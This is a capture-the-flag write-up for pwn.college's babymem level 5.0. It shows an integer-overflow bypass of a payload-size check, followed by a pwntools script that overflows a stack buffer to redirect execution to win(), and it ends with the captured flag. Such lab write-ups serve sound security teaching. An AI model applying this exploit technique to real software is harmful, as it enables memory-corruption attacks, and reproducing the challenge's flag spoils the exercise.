# level5.0
## Description
Overflow a buffer and smash the stack to obtain the flag, but this time bypass another check designed to prevent you from doing so!
## Solution
- Running `./babymem-level-5-0` we get the following output:
```
###
### Welcome to ./babymem-level-5-0!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffc02bc9550 (rsp+0x0000) | 60 95 bc 02 fc 7f 00 00 | 0x00007ffc02bc9560 |
| 0x00007ffc02bc9558 (rsp+0x0008) | 48 a7 bc 02 fc 7f 00 00 | 0x00007ffc02bca748 |
| 0x00007ffc02bc9560 (rsp+0x0010) | 38 a7 bc 02 fc 7f 00 00 | 0x00007ffc02bca738 |
| 0x00007ffc02bc9568 (rsp+0x0018) | a0 66 61 04 01 00 00 00 | 0x00000001046166a0 |
| 0x00007ffc02bc9570 (rsp+0x0020) | 01 00 00 00 00 00 00 00 | 0x0000000000000001 |
| 0x00007ffc02bc9578 (rsp+0x0028) | 23 67 61 04 cd 7c 00 00 | 0x00007ccd04616723 |
| 0x00007ffc02bc9580 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc9588 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc9590 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc9598 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95a0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95a8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95b0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95b8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95c0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95c8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95d0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95d8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95e0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95e8 (rsp+0x0098) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95f0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc95f8 (rsp+0x00a8) | 30 2a 40 00 00 00 00 00 | 0x0000000000402a30 |
| 0x00007ffc02bc9600 (rsp+0x00b0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc02bc9608 (rsp+0x00b8) | 80 95 bc 02 fc 7f 00 00 | 0x00007ffc02bc9580 |
| 0x00007ffc02bc9610 (rsp+0x00c0) | 40 a6 bc 02 fc 7f 00 00 | 0x00007ffc02bca640 |
| 0x00007ffc02bc9618 (rsp+0x00c8) | 1a 2a 40 00 00 00 00 00 | 0x0000000000402a1a |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc02bc9550, and our base pointer points to 0x7ffc02bc9610.
This means that we have (decimal) 26 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 208 bytes.
The input buffer begins at 0x7ffc02bc9580, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 116 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffc02bc9618, 152 bytes after the start of your input buffer.
That means that you will need to input at least 160 bytes (116 to fill the buffer,
36 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

This challenge will let you send multiple payload records concatenated together.
It will make sure that the total payload size fits in the allocated buffer
on the stack. Can you send a carefully crafted input to break this calculation?
Number of payload records to send: 
```
- The program tells us that we need to input at least 160 bytes to overwrite the return address. Sending `-1` as input we get the following output:
```
Number of payload records to send: -1
Size of each payload record: 
```
- The program asks us for the size of each payload record. Sending `-1` as input we get the following output:
```
Size of each payload record: -1
Computed total payload size: 18446744065119617025
You have chosen to send 18446744065119617025 bytes of input!
This will allow you to write from 0x7ffc02bc9580 (the start of the input buffer)
right up to (but not including) 0x7ffa02bc9581 (which is -115 bytes beyond the end of the buffer).
Of these, you will overwrite -151 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffc02bc9618, 152 bytes past the start of the input buffer)
with 0x4021a5, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to 18446744065119617025 bytes)!
ERROR: Failed to read input -- Bad address!
```
- The computed total payload size is too large, so I tried another input (-1 and 116):
```
Number of payload records to send: -1
Size of each payload record: 116
babymem-level-5-0: /challenge/babymem-level-5-0.c:147: challenge: Assertion `record_size * record_num <= 116' failed.
Aborted
```
- After a bit of trial and error and chatting with [Sensai](https://pwn.college/sensai), it suggested this:
```
When you multiply two large integers, the result can wrap around if it exceeds the maximum value that can be stored in the variable. This is often the key to bypassing checks that rely on integer multiplication.

Consider trying combinations of large positive numbers that could cause this overflow. Have you tried using values that are close to the maximum integer size?
```
- I tried both the inputs as `2147483647` (maximum value of a signed 32-bit integer) and it worked whilst not crashing the program:
```
Number of payload records to send: 2147483647
Size of each payload record: 2147483647
Computed total payload size: 4611686014132420609
You have chosen to send 4611686014132420609 bytes of input!
This will allow you to write from 0x7ffe6cef7aa0 (the start of the input buffer)
right up to (but not including) 0x40007ffd6cef7aa1 (which is -115 bytes beyond the end of the buffer).
Of these, you will overwrite -151 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffe6cef7b38, 152 bytes past the start of the input buffer)
with 0x4021a5, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to 4611686014132420609 bytes)!
```
- Wrote a python script to generate the payload:
```python
import pwn

padding = b'A' * 152
payload = padding + pwn.p64(0x4021a5)

r = pwn.process('/challenge/babymem-level-5-0')
r.recvuntil('send: ')
r.sendline('2147483647')
r.recvuntil('record: ')
r.sendline('2147483647')

r.recvuntil('bytes)!')
r.send(payload)
print(r.readall())
```
- Running the script we get the flag: `pwn.college{kiHOCgTgEf2-SjNihkPjpHoF-Ci.01N5IDL5QTO0czW}`.